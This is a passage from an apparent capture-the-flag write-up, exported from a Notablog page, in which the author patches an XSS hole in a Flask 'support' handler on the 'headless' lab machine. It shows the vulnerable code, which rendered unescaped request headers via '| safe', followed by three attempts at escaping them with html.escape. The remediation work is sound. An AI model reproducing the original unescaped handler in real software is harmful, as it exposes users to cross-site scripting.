+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>strong</span><span class="token punctuation">></span></span>Client Request Information:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>strong</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>pre</span><span class="token punctuation">></span></span>{{ request_info }}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>pre</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span></span></span></code></pre><div id="https://www.notion.so/f25166822e224037a2964ff1c32ed4d3" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’ll also modify </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">app.py</code></span><span class="SemanticString"> to run on port 5555:</span></span></p></div><pre id="https://www.notion.so/f05e20b90a5446ec9d9c8197eab1f66d" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
+    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">5555</span><span class="token punctuation">)</span></span></span></span></code></pre><div id="https://www.notion.so/796e7b36da6044479dba33790199c3aa" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">And finally start the server:</span></span></p></div><pre id="https://www.notion.so/ec9a9af174eb436fa1b44f69dda7a9ef" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>root@headless:/home/dvir/app#</span></mark></span><span class="SemanticString"><span> python3 app.py 
+
+ * Serving Flask app &#x27;app&#x27;
+ * Debug mode: off
+WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5555
+ * Running on http://10.129.32.248:5555
+Press CTRL+C to quit</span></span></span></code></pre><div id="https://www.notion.so/d80a6d5872014e9e8dfef6d9bb6197cc" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Now the “patched” version can be accessed on port 5555:</span></span></p></div><div id="https://www.notion.so/7c1f3eb5ab574040b582e0a04ad98079" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fffc6238f-2fd8-4f69-ba8b-c77a621d0a78%2FUntitled.png?width=1433&amp;table=block&amp;id=7c1f3eb5-ab57-4040-b582-e0a04ad98079"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fffc6238f-2fd8-4f69-ba8b-c77a621d0a78%2FUntitled.png?width=1433&amp;table=block&amp;id=7c1f3eb5-ab57-4040-b582-e0a04ad98079" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/852e9759d6b3436bad38ff77d00b82dc" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’ll send an XSS payload to trigger the report generation. However, the entire report is now escaped HTML. While it technically fixed the issue, it’s super messy.</span></span></p></div><div id="https://www.notion.so/8d405deb01cd4fd6ba01bd1025dc8dfa" class="Image Image--Normal"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F6cb1dd62-3b71-4b7a-9941-28c02e203c73%2FUntitled.png?width=703&amp;table=block&amp;id=8d405deb-01cd-4fd6-ba01-bd1025dc8dfa"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F6cb1dd62-3b71-4b7a-9941-28c02e203c73%2FUntitled.png?width=703&amp;table=block&amp;id=8d405deb-01cd-4fd6-ba01-bd1025dc8dfa" style="width:703px"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/c126d9eaf7844073ad885ee4ea0efeb6" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Let’s fix this.</span></span></p></div><div id="https://www.notion.so/bdaf1462fe234ae791fb24609e36e41a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/ce423e5f2b1f4a1f8db9b5d95ff58fe7" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’ll have another look at </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">app.py</code></span><span class="SemanticString">, specifically the following functions:</span></span></p></div><pre id="https://www.notion.so/23d14cbb04f2457281fa2cc05037ae14" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/support'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">support</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>
+        message <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'message'</span><span class="token punctuation">)</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"&lt;"</span> <span class="token keyword">in</span> message <span class="token keyword">and</span> <span class="token string">">"</span> <span class="token keyword">in</span> message<span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token punctuation">(</span><span class="token string">"{{"</span> <span class="token keyword">in</span> message <span class="token keyword">and</span> <span class="token string">"}}"</span> <span class="token keyword">in</span> message<span class="token punctuation">)</span><span class="token punctuation">:</span>
+            request_info <span class="token operator">=</span> <span class="token punctuation">{</span>
+                <span class="token string">"Method"</span><span class="token punctuation">:</span> request<span class="token punctuation">.</span>method<span class="token punctuation">,</span>
+                <span class="token string">"URL"</span><span class="token punctuation">:</span> request<span class="token punctuation">.</span>url<span class="token punctuation">,</span>
+                <span class="token string">"Headers"</span><span class="token punctuation">:</span> format_request_info<span class="token punctuation">(</span><span class="token builtin">dict</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>headers<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+            <span class="token punctuation">}</span>
+
+            formatted_request_info <span class="token operator">=</span> format_request_info<span class="token punctuation">(</span>request_info<span class="token punctuation">)</span>
+            html <span class="token operator">=</span> render_template<span class="token punctuation">(</span><span class="token string">'hackattempt.html'</span><span class="token punctuation">,</span> request_info<span class="token operator">=</span>formatted_request_info<span class="token punctuation">)</span>
+
+            <span class="token operator">&lt;</span><span class="token punctuation">.</span><span class="token punctuation">.</span>SNIP<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">></span>
+
+            <span class="token keyword">return</span> html
+
+    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'support.html'</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">format_request_info</span><span class="token punctuation">(</span>info<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    formatted_info <span class="token operator">=</span> <span class="token string">''</span>
+    <span class="token keyword">for</span> key<span class="token punctuation">,</span> value <span class="token keyword">in</span> info<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        formatted_info <span class="token operator">+=</span> <span class="token string-interpolation"><span class="token string">f"&lt;strong></span><span class="token interpolation"><span class="token punctuation">{</span>key<span class="token punctuation">}</span></span><span class="token string">:&lt;/strong> </span><span class="token interpolation"><span class="token punctuation">{</span>value<span class="token punctuation">}</span></span><span class="token string">&lt;br>"</span></span>
+    <span class="token keyword">return</span> formatted_info
+
+<span class="token keyword">def</span> <span class="token function">format_form_data</span><span class="token punctuation">(</span>form_data<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    formatted_data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
+    <span class="token keyword">for</span> key<span class="token punctuation">,</span> value <span class="token keyword">in</span> form_data<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        formatted_data<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> value
+    <span class="token keyword">return</span> formatted_data</span></span></span></code></pre><div id="https://www.notion.so/48f8d8c8a8794260a794c6cdf9d7a3f7" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The execution flow can be broken down into the followings:</span></span></p></div><ol class="NumberedListWrapper"><li id="https://www.notion.so/4598d2bd11274f18a7027b26897ba8a2" class="NumberedList" value="1"><span class="SemanticStringArray"><span class="SemanticString">Request info saved into </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">request_info</code></span><span class="SemanticString"> as a dictionary.</span></span></li><li id="https://www.notion.so/20260121b8a14ca4959aedbd506d70b0" class="NumberedList" value="2"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">request_info</code></span><span class="SemanticString"> sent to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">format_request_info()</code></span><span class="SemanticString"> for formatting, which essentially makes the key bold and places </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">&lt;br&gt;</code></span><span class="SemanticString"> between each entries.</span></span></li><li id="https://www.notion.so/05d1085dcb9141ecad2f056fbe33d6a0" class="NumberedList" value="3"><span class="SemanticStringArray"><span class="SemanticString">The formatted string is returned and sent to the Jinja2 template for rendering.</span></span></li></ol><div id="https://www.notion.so/5ff7588be3fc457ba54f13772079926f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">This explains the use of </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">| safe</code></span><span class="SemanticString"> in the template, as it’s expecting valid HTML elements. As such, filtering has to be done in the Python script.</span></span></p></div><div id="https://www.notion.so/60f15671a15c4d5999ed7ff0baaea115" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/b5353c52d0054d54a807b9daffbf77c5" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Attempt 2:</strong></span></span></p></div><div id="https://www.notion.so/856aab4659d7413d8465eead59c08d8d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’ll do the escaping in the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">format_request_info()</code></span><span class="SemanticString"> function, using </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://www.geeksforgeeks.org/html-escape-in-python/">html.escape()</a></span><span class="SemanticString">:</span></span></p></div><pre id="https://www.notion.so/46aa8f1775b54054b4cb3d01090dcce8" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token keyword">def</span> <span class="token function">format_request_info</span><span class="token punctuation">(</span>info<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    formatted_info <span class="token operator">=</span> <span class="token string">''</span>
+    <span class="token keyword">for</span> key<span class="token punctuation">,</span> value <span class="token keyword">in</span> info<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        formatted_info <span class="token operator">+=</span> <span class="token string-interpolation"><span class="token string">f"&lt;strong></span><span class="token interpolation"><span class="token punctuation">{</span>key<span class="token punctuation">}</span></span><span class="token string">:&lt;/strong> </span><span class="token interpolation"><span class="token punctuation">{</span>html<span class="token punctuation">.</span>escape<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">&lt;br>"</span></span>
+    <span class="token keyword">return</span> formatted_info</span></span></span></code></pre><div id="https://www.notion.so/a7a2a41423f946fabdce70c4fc087575" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">However, this still did not fully work, the Headers are still a mess.</span></span></p></div><div id="https://www.notion.so/0b1e538799bb497ea24403c4af4af5b7" class="Image Image--Normal"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fa63ea290-1c91-4dce-89d5-3440e2a8ca74%2FUntitled.png?width=660&amp;table=block&amp;id=0b1e5387-99bb-497e-a244-03c4af4af5b7"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fa63ea290-1c91-4dce-89d5-3440e2a8ca74%2FUntitled.png?width=660&amp;table=block&amp;id=0b1e5387-99bb-497e-a244-03c4af4af5b7" style="width:660px"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/679605bcb30146729d5f8a1ea0423d17" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Upon further inspection, the dictionary is in fact a nested one, and the headers are sent to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">format_request_info()</code></span><span class="SemanticString"> twice, resulting in the above mess</span></span></p></div><pre id="https://www.notion.so/21a795e638c8403cae08744b08006187" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>            request_info <span class="token operator">=</span> <span class="token punctuation">{</span>
+                <span class="token string">"Method"</span><span class="token punctuation">:</span> request<span class="token punctuation">.</span>method<span class="token punctuation">,</span>
+                <span class="token string">"URL"</span><span class="token punctuation">:</span> request<span class="token punctuation">.</span>url<span class="token punctuation">,</span>
+                <span class="token string">"Headers"</span><span class="token punctuation">:</span> format_request_info<span class="token punctuation">(</span><span class="token builtin">dict</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>headers<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+            <span class="token punctuation">}</span>
+
+            formatted_request_info <span class="token operator">=</span> format_request_info<span class="token punctuation">(</span>request_info<span class="token punctuation">)</span></span></span></span></code></pre><div id="https://www.notion.so/dd47dedfebf2474bbe712ed620781020" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/bb9826387df743e182ce4b203a289597" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Attempt 3:</strong></span></span></p></div><div id="https://www.notion.so/812bf270bc654d57b219cbaea72ed5cf" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">This time, I’ll add code to specifically sanitize the headers:</span></span></p></div><pre id="https://www.notion.so/fe65cc25b9c14bf19782dfdf45201e1d" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/support'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">support</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>
+        message <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'message'</span><span class="token punctuation">)</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"&lt;"</span> <span class="token keyword">in</span> message <span class="token keyword">and</span> <span class="token string">">"</span> <span class="token keyword">in</span> message<span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token punctuation">(</span><span class="token string">"{{"</span> <span class="token keyword">in</span> message <span class="token keyword">and</span> <span class="token string">"}}"</span> <span class="token keyword">in</span> message<span class="token punctuation">)</span><span class="token punctuation">:</span>
+            sanitized_headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
+            <span class="token keyword">for</span> key<span class="token punctuation">,</span> value <span class="token keyword">in</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>headers<span class="token punctuation">)</span><span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+                sanitized_key <span class="token operator">=</span> h<span class="token punctuation">.</span>escape<span class="token punctuation">(</span>key<span class="token punctuation">)</span>
+                sanitized_value <span class="token operator">=</span> h<span class="token punctuation">.</span>escape<span class="token punctuation">(</span>value<span class="token punctuation">)</span>
+                sanitized_headers<span class="token punctuation">[</span>sanitized_key<span class="token punctuation">]</span> <span class="token operator">=</span> sanitized_value
+            request_info <span class="token operator">=</span> <span class="token punctuation">{</span>
+                <span class="token string">"Method"</span><span class="token punctuation">:</span> request<span class="token punctuation">.</span>method<span class="token punctuation">,</span>
+                <span class="token string">"URL"</span><span class="token punctuation">:</span> request<span class="token punctuation">.</span>url<span class="token punctuation">,</span>
+                <span class="token string">"Headers"</span><span class="token punctuation">:</span> format_request_info<span class="token punctuation">(</span>sanitized_headers<span class="token punctuation">)</span><span class="token punctuation">,</span>
+            <span class="token punctuation">}</span>
+
+            formatted_request_info <span class="token operator">=</span> format_request_info<span class="token punctuation">(</span>request_info<span class="token punctuation">)</span>
+            html <span class="token operator">=</span> render_template<span class="token punctuation">(</span><span class="token string">'hackattempt.html'</span><span class="token punctuation">,</span> request_info<span class="token operator">=</span>formatted_request_info<span class="token punctuation">)</span>
+
+            filename <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">{</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">99999999999999999999999</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">.html'</span></span>
+            <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>hacking_reports_dir<span class="token punctuation">,</span> filename<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> html_file<span class="token punctuation">:</span>
+                html_file<span class="token punctuation">.</span>write<span class="token punctuation">(</span>html<span class="token punctuation">)</span>
+
+            <span class="token keyword">return</span> html
+
+    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'support.html'</span><span class="token punctuation">)</span></span></span></span></code></pre><div id="https://www.notion.so/e4c917e0aa574214a3359433848035b0" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Now the original format is preserved while escaping HTML, and the payload used previously no longer worked:</span></span></p></div><div id="https://www.notion.so/4d282da1a01a47208e6bfc0b224731eb" class="Image Image--Normal"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F1fe4349a-4c59-4358-baa7-c556de44884a%2FUntitled.png?width=679&amp;table=block&amp;id=4d282da1-a01a-4720-8e6b-fc0b224731eb"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F1fe4349a-4c59-4358-baa7-c556de44884a%2FUntitled.png?width=679&amp;table=block&amp;id=4d282da1-a01a-4720-8e6b-fc0b224731eb" style="width:679px"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/9437967fdf3744948b311dbc9f29e4ff" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/86becd2da83e4dbb9ea31d47c827cdf1" class="Divider"></div></article>
+  <footer class="Footer">
+  <div>&copy; C:\Users\ch3ng &gt;_ 2024</div>
+  <div>&centerdot;</div>
+  <div>Powered by <a href="https://github.com/dragonman225/notablog" target="_blank"
+      rel="noopener noreferrer">Notablog</a>.
+  </div>
+</footer>
+
+</body>
+
+</html>
